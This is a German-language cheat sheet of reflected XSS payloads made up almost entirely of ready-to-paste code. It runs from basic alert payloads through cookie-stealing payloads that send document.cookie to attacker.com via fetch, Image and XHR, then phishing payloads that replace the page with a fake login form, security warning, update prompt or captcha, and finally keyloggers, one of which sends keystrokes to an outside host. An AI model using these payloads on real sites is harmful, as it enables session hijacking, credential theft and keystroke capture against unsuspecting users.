# Reflected XSS Payloads

## Basis Payloads

### IMG-Tag mit onerror (EMPFOHLEN!)

```html
<img src=x onerror="alert('XSS')">
```

```html
<img src=x onerror="alert(document.cookie)">
```

```html
<img src=x onerror=alert(document.cookie)>
```

---

### SVG mit onload

```html
<svg onload="alert('XSS')">
```

```html
<svg onload="alert(document.cookie)">
```

```html
<svg onload=alert(document.cookie)>
```

---

### Input mit autofocus

```html
<input autofocus onfocus="alert('XSS')">
```

```html
<input autofocus onfocus="alert(document.cookie)">
```

```html
<input autofocus onfocus=alert(document.cookie)>
```

---

### Details-Tag mit ontoggle

```html
<details open ontoggle="alert('XSS')">
```

```html
<details open ontoggle="alert(document.cookie)">
```

```html
<details open ontoggle=alert(document.cookie)>
```

---

### IFRAME mit javascript:

```html
<iframe src="javascript:alert('XSS')">
```

```html
<iframe src="javascript:alert(document.cookie)">
```

---

### Body-Tag mit onload

```html
<body onload="alert('XSS')">
```

```html
<body onload="alert(document.cookie)">
```

---

### JavaScript-URL in Link

```html
<a href="javascript:alert('XSS')">Klick</a>
```

```html
<a href="javascript:alert(document.cookie)">Klick</a>
```

---

### Video/Audio mit onerror

```html
<video src=x onerror="alert('XSS')">
```

```html
<audio src=x onerror="alert(document.cookie)">
```

---

### Marquee mit onstart

```html
<marquee onstart="alert('XSS')">Text</marquee>
```

```html
<marquee onstart="alert(document.cookie)">Text</marquee>
```

---

### Object-Tag

```html
<object data="javascript:alert('XSS')">
```

```html
<object data="javascript:alert(document.cookie)">
```

---

## Cookie-Diebstahl

### Cookies anzeigen

```html
<img src=x onerror="alert(document.cookie)">
```

---

### Cookies an Server senden (fetch)

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

---

### Cookies an Server senden (Image)

```html
<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
```

---

### Mit URL-Encoding

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))">
```

---

### Via XMLHttpRequest

```html
<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://attacker.com/steal?c='+document.cookie);x.send()">
```

---

### Cookies + URL + UserAgent

```html
<img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,a:navigator.userAgent})})">
```

---

## Phishing

### Fake Login-Form

```html
<img src=x onerror="document.body.innerHTML='<div style=\"max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.1)\"><h2 style=\"text-align:center\">Login</h2><form onsubmit=\"alert(document.getElementById(\'e\').value+\' \'+document.getElementById(\'p\').value);return false\"><input id=\"e\" type=\"email\" placeholder=\"E-Mail\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><input id=\"p\" type=\"password\" placeholder=\"Passwort\" style=\"width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px\"><button type=\"submit\" style=\"width:100%;background:#000;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer\">Login</button></form></div>'">
```

---

### Fake Sicherheitswarnung

```html
<img src=x onerror="document.body.innerHTML='<div style=\"max-width:500px;margin:100px auto;padding:30px;background:#fff3cd;border:2px solid #ffc107;border-radius:8px\"><h2 style=\"color:#856404\">⚠️ Sicherheitswarnung</h2><p style=\"color:#856404\">Verdächtige Aktivitäten wurden festgestellt. Bitte verifizieren Sie Ihre Identität.</p><button onclick=\"alert(\\\'Clicked!\\\')\">Verifizieren</button></div>'">
```

---

### Fake Update-Hinweis

```html
<img src=x onerror="alert('⚠️ Wichtiges Sicherheitsupdate verfügbar! Klicken Sie OK um fortzufahren.')">
```

---

### Fake Browser-Update

```html
<img src=x onerror="document.body.innerHTML='<div style=\"text-align:center;padding:100px;font-family:Arial\"><h1>Browser Update erforderlich</h1><p>Ihr Browser ist veraltet. Bitte aktualisieren Sie jetzt.</p><button style=\"background:#4CAF50;color:white;padding:15px 30px;border:none;border-radius:4px;font-size:16px;cursor:pointer\">Jetzt aktualisieren</button></div>'">
```

---

### Fake Captcha

```html
<img src=x onerror="document.body.innerHTML='<div style=\"text-align:center;padding:100px\"><h2>Sicherheitsprüfung</h2><p>Bitte bestätigen Sie, dass Sie kein Roboter sind</p><button onclick=\"alert(\\\'Verified!\\\')\">Ich bin kein Roboter ✓</button></div>'">
```

---

### Fake Gewinnspiel

```html
<img src=x onerror="alert('🎉 Herzlichen Glückwunsch! Sie haben ein iPhone gewonnen! Klicken Sie hier um Ihren Preis zu erhalten.')">
```

---

## Keylogger

### Einfacher Keylogger (Console)

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;console.log('KEYS:'+k)}">
```

---

### Keylogger mit Alert nach 10 Zeichen

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>10)alert('Captured:'+k)}">
```

---

### Keylogger der an Server sendet

```html
<img src=x onerror="var k='';document.onkeypress=function(e){k+=e.key;if(k.length>20){fetch('https://attacker.com/keys?d='+k);k=''}}">
```

---
